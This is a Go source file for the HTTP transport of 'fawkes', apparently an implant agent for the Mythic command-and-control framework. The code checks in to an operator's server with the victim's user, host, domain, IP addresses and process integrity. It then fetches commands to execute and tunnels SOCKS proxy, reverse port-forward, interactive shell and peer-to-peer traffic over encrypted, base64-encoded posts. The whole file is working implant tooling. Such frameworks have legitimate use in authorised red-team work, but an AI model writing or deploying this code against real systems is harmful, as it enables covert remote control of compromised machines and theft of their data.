package http

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net/http"

	"fawkes/pkg/structs"
)


// Checkin performs the initial checkin with Mythic
func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
	cfg := h.getConfig()
	if cfg == nil {
		return fmt.Errorf("failed to decrypt C2 configuration")
	}

	checkinMsg := structs.CheckinMessage{
		Action:       "checkin",
		PayloadUUID:  agent.PayloadUUID,
		User:         agent.User,
		Host:         agent.Host,
		PID:          agent.PID,
		OS:           agent.OS,
		Architecture: agent.Architecture,
		Domain:       agent.Domain,
		IPs:          []string{agent.InternalIP},
		ExternalIP:   agent.ExternalIP,
		ProcessName:  agent.ProcessName,
		Integrity:    agent.Integrity,
	}

	body, err := json.Marshal(checkinMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal checkin message: %w", err)
	}

	// Encrypt if encryption key is provided
	if cfg.EncryptionKey != "" {
		body, err = h.encryptMessage(body, cfg.EncryptionKey)
		if err != nil {
			return fmt.Errorf("encryption failed: %w", err)
		}
	}

	// Send using Freyja-style format: UUID + JSON, then base64 encode
	messageData := append([]byte(agent.PayloadUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	// Send checkin request to configured endpoint
	resp, err := h.makeRequest("POST", cfg.PostEndpoint, []byte(encodedData), cfg)
	if err != nil {
		return fmt.Errorf("checkin request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("checkin failed with status: %d", resp.StatusCode)
	}

	// Read and process the checkin response to extract callback UUID
	respBody, err := readResponseBody(resp)
	if err != nil {
		return fmt.Errorf("failed to read checkin response: %w", err)
	}

	// Decrypt the checkin response if needed
	var decryptedResponse []byte
	if cfg.EncryptionKey != "" {
		// Base64 decode the response
		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
		if err != nil {
			return fmt.Errorf("failed to decode checkin response: %w", err)
		}

		// Decrypt the response
		decryptedResponse, err = h.decryptResponse(decodedData, cfg.EncryptionKey)
		if err != nil {
			return fmt.Errorf("failed to decrypt checkin response: %w", err)
		}
	} else {
		decryptedResponse = respBody
	}

	// Parse the response to extract callback UUID
	var checkinResponse map[string]interface{}
	if err := json.Unmarshal(decryptedResponse, &checkinResponse); err != nil {
		return fmt.Errorf("failed to parse checkin response: %w", err)
	}

	// Extract callback UUID (commonly called 'id' or 'uuid' in response)
	if callbackID, exists := checkinResponse["id"]; exists {
		if callbackStr, ok := callbackID.(string); ok {
			h.UpdateCallbackUUID(callbackStr)
			log.Printf("session: %s", callbackStr)
		}
	} else if callbackUUID, exists := checkinResponse["uuid"]; exists {
		if callbackStr, ok := callbackUUID.(string); ok {
			h.UpdateCallbackUUID(callbackStr)
			log.Printf("session: %s", callbackStr)
		}
	} else {
		log.Printf("no session id, using default")
		h.UpdateCallbackUUID(agent.PayloadUUID)
	}

	return nil
}

// GetTasking retrieves tasks and inbound SOCKS data from Mythic, sending any pending outbound SOCKS data
func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
	cfg := h.getConfig()
	if cfg == nil {
		return nil, nil, fmt.Errorf("failed to decrypt C2 configuration")
	}

	taskingMsg := structs.TaskingMessage{
		Action:      "get_tasking",
		TaskingSize: -1, // Get all pending tasks (important for SOCKS throughput)
		Socks:       outboundSocks,
		// Include agent identification for checkin updates
		PayloadUUID: h.getActiveUUID(agent, cfg), // Use callback UUID if available
		PayloadType: "fawkes",
		C2Profile:   "http",
	}

	// Collect delegate messages from linked P2P children (no edges — GetTasking can't carry them)
	if h.GetDelegatesOnly != nil {
		delegates := h.GetDelegatesOnly()
		if len(delegates) > 0 {
			taskingMsg.Delegates = delegates
		}
	}

	// Collect rpfwd outbound messages
	if h.GetRpfwdOutbound != nil {
		rpfwdMsgs := h.GetRpfwdOutbound()
		if len(rpfwdMsgs) > 0 {
			taskingMsg.Rpfwd = rpfwdMsgs
		}
	}

	// Collect interactive outbound messages (PTY output)
	if h.GetInteractiveOutbound != nil {
		interactiveMsgs := h.GetInteractiveOutbound()
		if len(interactiveMsgs) > 0 {
			taskingMsg.Interactive = interactiveMsgs
		}
	}

	body, err := json.Marshal(taskingMsg)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to marshal tasking message: %w", err)
	}

	// Encrypt if encryption key is provided
	if cfg.EncryptionKey != "" {
		body, err = h.encryptMessage(body, cfg.EncryptionKey)
		if err != nil {
			return nil, nil, fmt.Errorf("encryption failed: %w", err)
		}
	}

	// Send using Freyja-style format: UUID + JSON, then base64 encode
	activeUUID := h.getActiveUUID(agent, cfg)
	messageData := append([]byte(activeUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	resp, err := h.makeRequest("POST", cfg.PostEndpoint, []byte(encodedData), cfg)
	if err != nil {
		return nil, nil, fmt.Errorf("get tasking request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, nil, fmt.Errorf("get tasking failed with status: %d", resp.StatusCode)
	}

	respBody, err := readResponseBody(resp)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to read response body: %w", err)
	}

	// Decrypt the response if encryption key is provided
	var decryptedData []byte
	if cfg.EncryptionKey != "" {
		// First, base64 decode the response
		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
		if err != nil {
			return nil, nil, fmt.Errorf("failed to decode response: %w", err)
		}

		// Decrypt the decoded data
		decryptedData, err = h.decryptResponse(decodedData, cfg.EncryptionKey)
		if err != nil {
			return nil, nil, fmt.Errorf("failed to decrypt response: %w", err)
		}
	} else {
		decryptedData = respBody
	}

	// Parse the decrypted response - Mythic returns different formats
	var taskResponse map[string]interface{}
	if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
		// If not JSON, might be no tasks
		return []structs.Task{}, nil, nil
	}

	// Extract tasks from response
	var tasks []structs.Task
	if taskList, exists := taskResponse["tasks"]; exists {
		if taskArray, ok := taskList.([]interface{}); ok {
			for _, taskData := range taskArray {
				if taskMap, ok := taskData.(map[string]interface{}); ok {
					task := structs.NewTask(
						getString(taskMap, "id"),
						getString(taskMap, "command"),
						getString(taskMap, "parameters"),
					)
					tasks = append(tasks, task)
				}
			}
		}
	}

	// Extract SOCKS messages from response
	var inboundSocks []structs.SocksMsg
	if socksList, exists := taskResponse["socks"]; exists {
		if socksRaw, err := json.Marshal(socksList); err == nil {
			if err := json.Unmarshal(socksRaw, &inboundSocks); err != nil {
				log.Printf("proxy parse error: %v", err)
			}
		}
	}

	// Route rpfwd messages from Mythic to the rpfwd manager
	if h.HandleRpfwd != nil {
		if rpfwdList, exists := taskResponse["rpfwd"]; exists {
			if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
				var rpfwdMsgs []structs.SocksMsg
				if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
					h.HandleRpfwd(rpfwdMsgs)
				}
			}
		}
	}

	// Route interactive messages from Mythic to tasks (PTY input)
	if h.HandleInteractive != nil {
		if interactiveList, exists := taskResponse["interactive"]; exists {
			if interactiveRaw, err := json.Marshal(interactiveList); err == nil {
				var interactiveMsgs []structs.InteractiveMsg
				if err := json.Unmarshal(interactiveRaw, &interactiveMsgs); err == nil && len(interactiveMsgs) > 0 {
					h.HandleInteractive(interactiveMsgs)
				}
			}
		}
	}

	// Route delegate messages from Mythic to linked P2P children
	if h.HandleDelegates != nil {
		if delegateList, exists := taskResponse["delegates"]; exists {
			if delegateRaw, err := json.Marshal(delegateList); err == nil {
				var delegates []structs.DelegateMessage
				if err := json.Unmarshal(delegateRaw, &delegates); err == nil && len(delegates) > 0 {
					h.HandleDelegates(delegates)
				}
			}
		}
	}

	return tasks, inboundSocks, nil
}




// PostResponse sends a response back to Mythic, optionally including pending SOCKS data
func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error) {
	cfg := h.getConfig()
	if cfg == nil {
		return nil, fmt.Errorf("failed to decrypt C2 configuration")
	}

	responseMsg := structs.PostResponseMessage{
		Action:    "post_response",
		Responses: []structs.Response{response},
		Socks:     socks,
	}

	// Collect rpfwd outbound messages
	if h.GetRpfwdOutbound != nil {
		rpfwdMsgs := h.GetRpfwdOutbound()
		if len(rpfwdMsgs) > 0 {
			responseMsg.Rpfwd = rpfwdMsgs
		}
	}

	// Collect delegate messages and edge notifications from linked P2P children
	if h.GetDelegatesAndEdges != nil {
		delegates, edges := h.GetDelegatesAndEdges()
		if len(delegates) > 0 {
			responseMsg.Delegates = delegates
		}
		if len(edges) > 0 {
			responseMsg.Edges = edges
		}
	}

	// Collect interactive outbound messages (PTY output)
	if h.GetInteractiveOutbound != nil {
		interactiveMsgs := h.GetInteractiveOutbound()
		if len(interactiveMsgs) > 0 {
			responseMsg.Interactive = interactiveMsgs
		}
	}

	body, err := json.Marshal(responseMsg)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal response message: %w", err)
	}

	// Encrypt if encryption key is provided
	if cfg.EncryptionKey != "" {
		body, err = h.encryptMessage(body, cfg.EncryptionKey)
		if err != nil {
			return nil, fmt.Errorf("encryption failed: %w", err)
		}
	}

	// Send using Freyja-style format: UUID + JSON, then base64 encode
	// Must use callback UUID (not payload UUID) after checkin
	activeUUID := h.getActiveUUID(agent, cfg)
	messageData := append([]byte(activeUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	resp, err := h.makeRequest("POST", cfg.PostEndpoint, []byte(encodedData), cfg)
	if err != nil {
		return nil, fmt.Errorf("post response request failed: %w", err)
	}
	defer resp.Body.Close()

	// Read response body
	respBody, err := readResponseBody(resp)
	if err != nil {
		return nil, fmt.Errorf("failed to read PostResponse body: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("post response failed with status: %d", resp.StatusCode)
	}

	// Decrypt the response if encryption key is provided (same as GetTasking)
	var decryptedData []byte
	if cfg.EncryptionKey != "" {
		// First, base64 decode the response
		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
		if err != nil {
			return nil, fmt.Errorf("failed to decode PostResponse: %w", err)
		}

		// Decrypt the decoded data
		decryptedData, err = h.decryptResponse(decodedData, cfg.EncryptionKey)
		if err != nil {
			return nil, fmt.Errorf("failed to decrypt PostResponse: %w", err)
		}
	} else {
		decryptedData = respBody
	}

	// Route any PostResponse data (delegates, rpfwd) from Mythic
	if len(decryptedData) > 0 {
		var postRespData map[string]interface{}
		if err := json.Unmarshal(decryptedData, &postRespData); err == nil {
			// Route rpfwd messages
			if h.HandleRpfwd != nil {
				if rpfwdList, exists := postRespData["rpfwd"]; exists {
					if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
						var rpfwdMsgs []structs.SocksMsg
						if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
							h.HandleRpfwd(rpfwdMsgs)
						}
					}
				}
			}
			// Route delegate messages
			if h.HandleDelegates != nil {
				if delegateList, exists := postRespData["delegates"]; exists {
					if delegateRaw, err := json.Marshal(delegateList); err == nil {
						var delegates []structs.DelegateMessage
						if err := json.Unmarshal(delegateRaw, &delegates); err == nil && len(delegates) > 0 {
							h.HandleDelegates(delegates)
						}
					}
				}
			}
			// Route interactive messages (PTY input)
			if h.HandleInteractive != nil {
				if interactiveList, exists := postRespData["interactive"]; exists {
					if interactiveRaw, err := json.Marshal(interactiveList); err == nil {
						var interactiveMsgs []structs.InteractiveMsg
						if err := json.Unmarshal(interactiveRaw, &interactiveMsgs); err == nil && len(interactiveMsgs) > 0 {
							h.HandleInteractive(interactiveMsgs)
						}
					}
				}
			}
		}
	}

	return decryptedData, nil
}
